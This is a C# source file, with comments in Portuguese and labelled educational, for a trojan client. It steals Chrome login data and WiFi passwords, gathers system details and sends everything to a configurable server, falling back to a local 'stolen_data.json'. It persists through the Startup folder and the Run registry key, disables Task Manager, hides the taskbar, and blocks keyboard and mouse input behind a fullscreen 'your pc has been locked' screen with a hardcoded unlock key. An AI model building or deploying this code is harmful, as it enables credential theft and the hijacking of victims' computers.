/*
============================================
  CLIENT - C# (C Sharp)
  Versão educacional - Engenharia de Software
  
  FUNCIONALIDADES:
  - Bloqueia input do teclado e mouse (Win32 API)
  - Tela fullscreen preta com mensagem
  - Campo de senha para destravar
  - Coleta info do sistema
  - Extrai senhas do Chrome
  - Extrai senhas de WiFi
  - Esconde barra de tarefas
  - Desativa Task Manager
  - Persistência via registro + Startup
  - Envia tudo pro servidor Python
============================================
*/

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Net.Http;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using Microsoft.Win32;
using Newtonsoft.Json;
using Newtonsoft.Json.Linq;

namespace TrojanClient
{
    class Program
    {
        // ============================================
        // CONFIGURACAO
        // ============================================
        static string SERVER_URL = "http://SEU_IP:5000"; // Troque pelo IP do servidor
        static string UNLOCK_KEY = "azzez";
        static string PROGRAM_NAME = "SystemProcess";

        // ============================================
        // WIN32 API
        // ============================================
        [DllImport("user32.dll")]
        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);

        [DllImport("user32.dll")]
        static extern IntPtr FindWindow(string lpClassName, string lpWindowName);

        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hhk);

        [DllImport("user32.dll")]
        static extern IntPtr GetModuleHandle(string lpModuleName);

        [DllImport("user32.dll")]
        static extern bool GetCursorPos(out POINT lpPoint);

        [DllImport("user32.dll")]
        static extern bool SetCursorPos(int X, int Y);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateMutex(IntPtr lpMutexAttributes, bool bInitialOwner, string lpName);

        delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        struct POINT { public int X; public int Y; }

        static IntPtr hookId = IntPtr.Zero;
        static HookProc hookProc = null;

        // ============================================
        // BLOQUEIO DE INPUT (Hook)
        // ============================================
        static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam)
        {
            // Bloqueia TUDO: teclado e mouse
            return (IntPtr)1;
        }

        static void InstallHook()
        {
            hookProc = HookCallback;
            using (Process curProcess = Process.GetCurrentProcess())
            using (ProcessModule curModule = curProcess.MainModule)
            {
                hookId = SetWindowsHookEx(13, hookProc, // WH_KEYBOARD_LL
                    GetModuleHandle(curModule.ModuleName), 0);
            }
            // Mouse hook
            IntPtr mouseHook = SetWindowsHookEx(14, hookProc, // WH_MOUSE_LL
                GetModuleHandle(curModule.MainModule.ModuleName), 0);
        }

        static void UninstallHook()
        {
            UnhookWindowsHookEx(hookId);
        }

        // ============================================
        // COLETA DE DADOS
        // ============================================
        static Dictionary<string, object> CollectSystemInfo()
        {
            var info = new Dictionary<string, object>();

            // Hardware
            info["hostname"] = Environment.MachineName;
            info["username"] = Environment.UserName;
            info["os"] = Environment.OSVersion.ToString();
            info["architecture"] = Environment.Is64BitOperatingSystem ? "64-bit" : "32-bit";
            info["processors"] = Environment.ProcessorCount;
            info["domain"] = Environment.UserDomainName;

            // Rede
            try
            {
                var httpClient = new HttpClient();
                httpClient.Timeout = TimeSpan.FromSeconds(3);
                string publicIp = httpClient.GetStringAsync("https://api.ipify.org").Result;
                info["public_ip"] = publicIp;
            }
            catch { info["public_ip"] = "Desconhecido"; }

            try
            {
                var ips = NetworkInterface.GetAllNetworkInterfaces();
                var networkList = new List<Dictionary<string, string>>();
                foreach (var ni in ips)
                {
                    if (ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                        {
                            networkList.Add(new Dictionary<string, string>
                            {
                                { "name", ni.Name },
                                { "ip", addr.Address.ToString() },
                                { "type", addr.Address.AddressFamily.ToString() }
                            });
                        }
                    }
                }
                info["network_interfaces"] = networkList;
            }
            catch { }

            // Disks
            try
            {
                var drives = DriveInfo.GetDrives();
                var diskList = new List<Dictionary<string, object>>();
                foreach (var drive in drives)
                {
                    if (drive.IsReady)
                    {
                        diskList.Add(new Dictionary<string, object>
                        {
                            { "name", drive.Name },
                            { "type", drive.DriveType.ToString() },
                            { "total_size_gb", Math.Round((double)drive.TotalSize / 1073741824, 2) },
                            { "free_space_gb", Math.Round((double)drive.AvailableFreeSpace / 1073741824, 2) }
                        });
                    }
                }
                info["disks"] = diskList;
            }
            catch { }

            // Softwares instalados
            try
            {
                var softwares = new List<string>();
                string[] paths = {
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                    @"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
                };

                foreach (string path in paths)
                {
                    using (var key = Registry.LocalMachine.OpenSubKey(path))
                    {
                        if (key != null)
                        {
                            foreach (string subkey in key.GetSubKeyNames())
                            {
                                using (var sk = key.OpenSubKey(subkey))
                                {
                                    if (sk != null)
                                    {
                                        var name = sk.GetValue("DisplayName");
                                        var version = sk.GetValue("DisplayVersion");
                                        if (name != null)
                                            softwares.Add($"{name} (v{version ?? "unknown"})");
                                    }
                                }
                            }
                        }
                    }
                }
                info["installed_software"] = softwares;
            }
            catch { }

            return info;
        }

        static string CollectChromePasswords()
        {
            var sb = new StringBuilder();

            try
            {
                string chromePath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "Google", "Chrome", "User Data", "Default", "Login Data"
                );

                if (!File.Exists(chromePath))
                {
                    return "Chrome nao encontrado ou sem senhas salvas.";
                }

                // Copia o banco de dados
                string tempDb = Path.Combine(Path.GetTempPath(), "chrome_login_temp.db");
                File.Copy(chromePath, tempDb, true);

                try
                {
                    // Usa SQLite (precisa do pacote NuGet System.Data.SQLite)
                    // Alternativa: ler via PowerShell
                    var process = new Process();
                    process.StartInfo.FileName = "powershell";
                    process.StartInfo.Arguments = $"-Command \"Get-Content '{tempDb}' -Encoding Byte | ForEach-Object {{ [System.Text.Encoding]::UTF8.GetString($_) }} | Select-String -Pattern 'https?://[^\"]+' -AllMatches | ForEach-Object {{ $_.Matches }} | ForEach-Object {{ $_.Value }}\"";
                    process.StartInfo.RedirectStandardOutput = true;
                    process.StartInfo.UseShellExecute = false;
                    process.StartInfo.CreateNoWindow = true;
                    process.Start();
                    string output = process.StandardOutput.ReadToEnd();
                    process.WaitForExit(5000);

                    if (!string.IsNullOrEmpty(output))
                        sb.AppendLine(output);
                    else
                        sb.AppendLine("Senhas encontradas mas nao foi possivel decriptografar (requer pywin32 ou similar).");
                }
                catch (Exception ex)
                {
                    sb.AppendLine($"Erro ao ler Chrome: {ex.Message}");
                }
                finally
                {
                    if (File.Exists(tempDb)) File.Delete(tempDb);
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Erro ao acessar Chrome: {ex.Message}");
            }

            return sb.ToString();
        }

        static string CollectWifiPasswords()
        {
            var sb = new StringBuilder();

            try
            {
                var process = new Process();
                process.StartInfo.FileName = "netsh";
                process.StartInfo.Arguments = "wlan show profiles";
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.StartInfo.CreateNoWindow = true;
                process.Start();
                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                var profiles = new List<string>();
                foreach (string line in output.Split('\n'))
                {
                    if (line.Contains("All User Profile") || line.Contains("Todos os Perfis"))
                    {
                        string name = line.Split(':')[1].Trim();
                        profiles.Add(name);
                    }
                }

                foreach (string profile in profiles)
                {
                    var proc2 = new Process();
                    proc2.StartInfo.FileName = "netsh";
                    proc2.StartInfo.Arguments = $"wlan show profile \"{profile}\" key=clear";
                    proc2.StartInfo.RedirectStandardOutput = true;
                    proc2.StartInfo.UseShellExecute = false;
                    proc2.StartInfo.CreateNoWindow = true;
                    proc2.Start();
                    string profileOutput = proc2.StandardOutput.ReadToEnd();
                    proc2.WaitForExit();

                    string password = "Sem senha";
                    foreach (string line in profileOutput.Split('\n'))
                    {
                        if (line.Contains("Key Content") || line.Contains("Conteudo da chave"))
                        {
                            password = line.Split(':')[1].Trim();
                        }
                    }
                    sb.AppendLine($"Rede: {profile} | Senha: {password}");
                }
            }
            catch (Exception ex)
            {
                sb.AppendLine($"Erro ao extrair WiFi: {ex.Message}");
            }

            return sb.ToString();
        }

        // ============================================
        // ENVIO PARA O SERVIDOR
        // ============================================
        static async Task SendToServer(Dictionary<string, object> sysInfo, string chromePw, string wifiPw)
        {
            try
            {
                using (var client = new HttpClient())
                {
                    client.Timeout = TimeSpan.FromSeconds(15);

                    var data = new Dictionary<string, object>
                    {
                        { "hostname", Environment.MachineName },
                        { "system_info", sysInfo },
                        { "chrome_passwords", chromePw },
                        { "wifi_passwords", wifiPw }
                    };

                    string json = JsonConvert.SerializeObject(data);
                    var content = new StringContent(json, Encoding.UTF8, "application/json");
                    var response = await client.PostAsync($"{SERVER_URL}/data", content);

                    if (response.IsSuccessStatusCode)
                    {
                        Console.WriteLine("[+] Dados enviados ao servidor!");
                    }
                    else
                    {
                        Console.WriteLine($"[!] Erro ao enviar: {response.StatusCode}");
                        // Salva localmente se falhar
                        SaveLocally(json);
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Erro de conexao: {ex.Message}");
                // Salva localmente
                string json = JsonConvert.SerializeObject(new {
                    hostname = Environment.MachineName,
                    system_info = sysInfo,
                    chrome_passwords = chromePw,
                    wifi_passwords = wifiPw
                });
                SaveLocally(json);
            }
        }

        static void SaveLocally(string json)
        {
            try
            {
                string path = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
                    ".hidden", "stolen_data.json"
                );
                Directory.CreateDirectory(Path.GetDirectoryName(path));
                File.WriteAllText(path, json);
                Console.WriteLine($"[+] Dados salvos localmente: {path}");
            }
            catch { }
        }

        // ============================================
        // PERSISTENCIA
        // ============================================
        static void SetupPersistence()
        {
            try
            {
                string startupPath = Path.Combine(
                    Environment.GetFolderPath(Environment.SpecialFolder.Startup),
                    $"{PROGRAM_NAME}.exe"
                );

                string currentPath = Process.GetCurrentProcess().MainModule.FileName;
                if (Path.GetFullPath(currentPath) != Path.GetFullPath(startupPath))
                {
                    File.Copy(currentPath, startupPath, true);
                }

                // Registro
                using (var key = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.SetValue(PROGRAM_NAME, currentPath);
                }

                // Desativa Task Manager
                using (var key = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 1, RegistryValueKind.DWord);
                }
            }
            catch { }
        }

        // ============================================
        // TELA DE LOCK
        // ============================================
        static Form lockForm;

        static void CreateLockScreen()
        {
            lockForm = new Form();
            lockForm.FormBorderStyle = FormBorderStyle.None;
            lockForm.WindowState = FormWindowState.Maximized;
            lockForm.BackColor = System.Drawing.Color.Black;
            lockForm.TopMost = true;
            lockForm.StartPosition = FormStartPosition.Manual;
            lockForm.Bounds = Screen.PrimaryScreen.Bounds;
            lockForm.Cursor = Cursors.None;

            lockForm.KeyPreview = true;
            lockForm.KeyDown += (s, e) => { e.Handled = true; };
            lockForm.KeyPress += (s, e) => { e.Handled = true; };

            // Esconde barra de tarefas
            IntPtr taskbar = FindWindow("Shell_TrayWnd", null);
            if (taskbar != IntPtr.Zero) ShowWindow(taskbar, 0);

            // Layout
            var mainPanel = new TableLayoutPanel();
            mainPanel.Dock = DockStyle.Fill;
            mainPanel.BackColor = System.Drawing.Color.Black;
            mainPanel.RowCount = 5;
            mainPanel.ColumnCount = 1;
            mainPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 20));
            mainPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 15));
            mainPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 15));
            mainPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 10));
            mainPanel.RowStyles.Add(new RowStyle(SizeType.Percent, 40));

            // Mensagem principal
            var msgPanel = new FlowLayoutPanel();
            msgPanel.Dock = DockStyle.Fill;
            msgPanel.BackColor = System.Drawing.Color.Black;
            msgPanel.FlowDirection = FlowDirection.LeftToRight;
            msgPanel.WrapContents = false;

            var label1 = new Label();
            label1.Text = "your pc has been locked by ";
            label1.Font = new System.Drawing.Font("Consolas", 28);
            label1.ForeColor = System.Drawing.Color.White;
            label1.BackColor = System.Drawing.Color.Black;
            label1.AutoSize = true;

            var label2 = new Label();
            label2.Text = "azz!";
            label2.Font = new System.Drawing.Font("Consolas", 28, System.Drawing.FontStyle.Bold);
            label2.ForeColor = System.Drawing.Color.Red;
            label2.BackColor = System.Drawing.Color.Black;
            label2.AutoSize = true;

            var label3 = new Label();
            label3.Text = " :)";
            label3.Font = new System.Drawing.Font("Consolas", 28);
            label3.ForeColor = System.Drawing.Color.White;
            label3.BackColor = System.Drawing.Color.Black;
            label3.AutoSize = true;

            msgPanel.Controls.Add(label1);
            msgPanel.Controls.Add(label2);
            msgPanel.Controls.Add(label3);

            mainPanel.Controls.Add(msgPanel, 0, 0);
            mainPanel.SetColumnSpan(msgPanel, 1);

            // Info da vitima
            var infoLabel = new Label();
            try
            {
                var ips = NetworkInterface.GetAllNetworkInterfaces();
                string localIp = "Desconhecido";
                foreach (var ni in ips)
                {
                    if (ni.OperationalStatus == OperationalStatus.Up)
                    {
                        foreach (var addr in ni.GetIPProperties().UnicastAddresses)
                        {
                            if (addr.Address.AddressFamily == System.Net.Sockets.AddressFamily.InterNetwork)
                            {
                                localIp = addr.Address.ToString();
                                break;
                            }
                        }
                    }
                }

                infoLabel.Text = $"Hostname: {Environment.MachineName}\n" +
                                 $"Username: {Environment.UserName}\n" +
                                 $"IP Local: {localIp}";
            }
            catch
            {
                infoLabel.Text = "Erro ao coletar info";
            }
            infoLabel.Font = new System.Drawing.Font("Consolas", 12);
            infoLabel.ForeColor = System.Drawing.Color.Lime;
            infoLabel.BackColor = System.Drawing.Color.Black;
            infoLabel.AutoSize = true;
            infoLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;

            mainPanel.Controls.Add(infoLabel, 0, 1);
            mainPanel.SetColumnSpan(infoLabel, 1);

            // Campo de senha
            var unlockLabel = new Label();
            unlockLabel.Text = "Tente desbloquear:";
            unlockLabel.Font = new System.Drawing.Font("Consolas", 12);
            unlockLabel.ForeColor = System.Drawing.Color.Gray;
            unlockLabel.BackColor = System.Drawing.Color.Black;
            unlockLabel.AutoSize = true;
            unlockLabel.TextAlign = System.Drawing.ContentAlignment.MiddleCenter;

            var textBox = new TextBox();
            textBox.Font = new System.Drawing.Font("Consolas", 16);
            textBox.BackColor = System.Drawing.Color.FromArgb(34, 34, 34);
            textBox.ForeColor = System.Drawing.Color.Red;
            textBox.UseSystemPasswordChar = true;
            textBox.Width = 300;
            textBox.TextAlign = HorizontalAlignment.Center;
            textBox.KeyDown += (s, e) =>
            {
                if (e.KeyCode == Keys.Enter)
                {
                    if (textBox.Text == UNLOCK_KEY)
                    {
                        UnlockScreen();
                    }
                    else
                    {
                        textBox.Text = "";
                        textBox.BackColor = System.Drawing.Color.DarkRed;
                        var t = new Timer();
                        t.Interval = 500;
                        t.Tick += (ss, ee) => { textBox.BackColor = System.Drawing.Color.FromArgb(34, 34, 34); t.Stop(); };
                        t.Start();
                    }
                }
            };

            var unlockPanel = new Panel();
            unlockPanel.BackColor = System.Drawing.Color.Black;
            unlockPanel.AutoSize = true;
            unlockPanel.Controls.Add(textBox);
            textBox.Location = new System.Drawing.Point(
                (unlockPanel.Width - textBox.Width) / 2,
                unlockLabel.Height + 10
            );
            unlockPanel.Controls.Add(unlockLabel);
            unlockLabel.Location = new System.Drawing.Point(
                (unlockPanel.Width - unlockLabel.Width) / 2, 0
            );

            mainPanel.Controls.Add(unlockPanel, 0, 2);
            mainPanel.SetColumnSpan(unlockPanel, 1);

            lockForm.Controls.Add(mainPanel);
            lockForm.Controls.SetChildIndex(mainPanel, 0);

            // Timer para manter fullscreen
            var keepAlive = new Timer();
            keepAlive.Interval = 1000;
            keepAlive.Tick += (s, e) =>
            {
                lockForm.WindowState = FormWindowState.Maximized;
                lockForm.TopMost = true;
                lockForm.BringToFront();
                lockForm.Focus();
            };
            keepAlive.Start();

            lockForm.ShowDialog();
        }

        static void UnlockScreen()
        {
            // Restaura Task Manager
            try
            {
                using (var key = Registry.CurrentUser.CreateSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"))
                {
                    key.SetValue("DisableTaskMgr", 0, RegistryValueKind.DWord);
                }
            }
            catch { }

            // Mostra barra de tarefas
            IntPtr taskbar = FindWindow("Shell_TrayWnd", null);
            if (taskbar != IntPtr.Zero) ShowWindow(taskbar, 1);

            // Remove hook
            UninstallHook();

            // Remove persistencia
            try
            {
                using (var key = Registry.CurrentUser.OpenSubKey(
                    @"SOFTWARE\Microsoft\Windows\CurrentVersion\Run", true))
                {
                    key.DeleteValue(PROGRAM_NAME, false);
                }
            }
            catch { }

            Environment.Exit(0);
        }

        // ============================================
        // MAIN
        // ============================================
        [STAThread]
        static void Main(string[] args)
        {
            Console.WriteLine("[*] Client iniciando...");

            // Mutex para instância única
            IntPtr mutex = CreateMutex(IntPtr.Zero, false, "Global\\TrojanCSharp_SingleInstance");

            // Persistencia
            SetupPersistence();

            // Coleta dados
            Console.WriteLine("[+] Coletando informacoes do sistema...");
            var sysInfo = CollectSystemInfo();

            Console.WriteLine("[+] Extraindo senhas do Chrome...");
            var chromePw = CollectChromePasswords();

            Console.WriteLine("[+] Extraindo senhas de WiFi...");
            var wifiPw = CollectWifiPasswords();

            // Envia dados (async, nao bloqueia)
            Task.Run(async () =>
            {
                await SendToServer(sysInfo, chromePw, wifiPw);
            });

            // Instala hook para bloquear input
            Console.WriteLine("[+] Bloqueando input...");
            InstallHook();

            // Inicia tela de lock
            Console.WriteLine("[*] Ativando tela de bloqueio...");
            CreateLockScreen();
        }
    }
}
